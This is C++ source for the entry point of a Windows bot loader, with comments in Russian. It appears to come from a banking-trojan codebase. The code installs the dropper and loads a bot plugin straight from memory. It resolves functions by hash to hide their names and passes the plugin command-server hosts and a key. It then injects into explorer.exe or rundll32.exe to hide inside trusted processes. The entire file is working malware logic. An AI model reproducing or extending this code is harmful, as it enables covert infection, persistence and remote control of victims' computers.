#include <windows.h>
#include <ShlObj.h>

#include "BotCore.h"
#include "DLLLoader.h"
#include "Inject.h"
#include "Installer.h"

//---------------------------------------------------------------------------

#include "BotDebug.h"

namespace DROPPERDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define DRPDBG DROPPERDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------



#pragma comment(linker, "/ENTRY:LoaderMain" )



char  DropperName[MAX_PATH];  // Имя ехе стартующего файла
DWORD DropperPID = 0;         // PID дропера бота


typedef BOOL (WINAPI *TSetBotParameter)(DWORD ParamID, PCHAR Param);
TSetBotParameter SetParam;


//---------------------------------------------
// Функция рельной установки значения параметра
//---------------------------------------------
bool DoSetParam(PCHAR Buf, DWORD BufSize, DWORD Id)
{
	bool Result = false;
	if (GetBotParameter(Id, Buf, BufSize))
		Result = SetParam(Id, Buf) != FALSE;
	return Result;
}

//---------------------------------------------
// Функция инициализирует параметры плагина
//---------------------------------------------
bool SetBotPlugParams(LPVOID Handle)
{
	// Получаем функцию установки параметра
	DRPDBG("_BOT_LOADER", "Устанавливаем параметры bot.plug");
	SetParam = (TSetBotParameter)MemoryGetProcAddress(Handle, 0xA336A349 /* SetBotParameter */);
	if (!SetParam) return false;

	const DWORD BufSize = MAX_MAINHOSTS_BUF_SIZE * 2; // Буфер резервируем с запасом
	char Buf[BufSize];

	bool Result = DoSetParam(Buf, BufSize, BOT_PARAM_PREFIX) &&
		          DoSetParam(Buf, BufSize, BOT_PARAM_HOSTS) &&
				  DoSetParam(Buf, BufSize, BOT_PARAM_KEY) &&
				  DoSetParam(Buf, BufSize, BOT_PARAM_DELAY);
	return Result;
}


//---------------------------------------------
//  Функция запускает плагин
//---------------------------------------------
void StartBotPlug(LPVOID Handle)
{
	DRPDBG("_BOT_LOADER", "Стартуем bot.plug");
	if (Handle)
	{
		typedef void (WINAPI *TStart)(BOOL Initialize, BOOL Start, BOOL IsLoaderPlugin);
		TStart Start = (TStart)MemoryGetProcAddress(Handle, 0x3E987971 /* Start */);
		if (Start)
		{
			// Инициализируем плагин
			Start(TRUE, FALSE, TRUE);
			// Устанавливаем параметры
			SetBotPlugParams(Handle);
			// Стартуем плаин
			Start(FALSE, TRUE, TRUE);

			DRPDBG("_BOT_LOADER", "Плагин запущен");
		}
	} 
}




//---------------------------------------------------------------------
//  Функция загрузки плагина
//---------------------------------------------------------------------
DWORD WINAPI DropperMainProc(LPVOID)
{

	BOT::Initialize();
	DRPDBG("_BOT_LOADER", "Запущена основная функция лоадера. Процесс: \r\n%s", Bot->ApplicationName().t_str());

	// Запускаем систему информирования о повторном запуске
	BOT::TryCreateBotInstance();
	// Инсталируем ладер
	Install(DropperName, FALSE, TRUE, DropperPID);  

	// Стартуем плагин
	LPVOID Plugin;
	if (LoadBotPlug(&Plugin, NULL))
	{
		DRPDBG("_BOT_LOADER", "bot.plug успешо загружен");
		LPVOID Handle = MemoryLoadLibrary(Plugin,  false);
		StartBotPlug(Handle);
		bool InExplorer = File::GetNameHashA(Bot->ApplicationName().t_str(),  true) == 0x490A0972 /* explorer.exe */;
		if (!InExplorer)
		{
			// Если не удалось заинжектиться в эксплорер стартуем инжектор
			DRPDBG("_BOT_LOADER", "Стартуем инжектор");
			typedef BOOL (WINAPI *TStartInjector)();
			TStartInjector StartInjector  = (TStartInjector)MemoryGetProcAddress(Handle, 0x2DD014DD /* StartInjector */);
			if (StartInjector) 
				StartInjector();
		}
		FreeBotPlug(Plugin);
	}
	pSleep(INFINITE);
	return 0; 
}

//---------------------------------------------------
//  StartMainFunc
//  Промежуточная функция запуска основного процесса
//  загрузчика в свхосте
//  предназначено для запуска через доверенный 
//  процесс
//---------------------------------------------------
DWORD WINAPI StartMainFunc(LPVOID)
{
	BOT::Initialize();
	MegaJump(DropperMainProc);
	pExitProcess(0);
	return 0;
}

/*
BOOL CALLBACK WndEnumCallBak(HWND Wnd, LPARAM Param)
{
	char ClassName[1024];
	pGetClassNameA(Wnd, ClassName, 1024);
	if (STRA::Pos(ClassName, "IEFrame") >= 0)
	{
		DWORD PID = 0;
		pGetWindowThreadProcessId(Wnd, &PID);
		string F;
		F.Format("%d %s", PID, ClassName);
		pOutputDebugStringA(F.t_str());
	}
	return TRUE;
}
*/
//---------------------------------------------------------------------
//  Основная функция txe  
//---------------------------------------------------------------------
int APIENTRY LoaderMain() 
{

//	ShellExecuteA(0, NULL, "calc.exe", NULL, NULL, SW_SHOWNORMAL);
//	ExitProcess(0);

	// Получаем имя дропера

//	EnumWindows(WndEnumCallBak, NULL);
//	ExitProcess(0);

	BOT::Initialize();

	if (!BOT::IsRunning())
	{
		DRPDBG("_BOT_LOADER", "Запускается загрузчик бота");
		DropperPID = GetCurrentProcessId();
		GetModuleFileNameA(NULL, DropperName, MAX_PATH);

		BOOL InExplorer = FALSE;
		if (!IsWIN64())
			InExplorer = InjectIntoExplorer(DropperMainProc) != FALSE;
		if (!InExplorer)
		{
			// Инжект не удался, запускаем основную функцию через свхост
			string ExeName = GetSpecialFolderPathA(CSIDL_SYSTEM, "rundll32.exe");
			if (!InjecIntoProcessByNameA(ExeName.t_str(), NULL, StartMainFunc))
				MegaJump(DropperMainProc);
		}
	} 

	
	pExitProcess(0); 
	return 0;
}



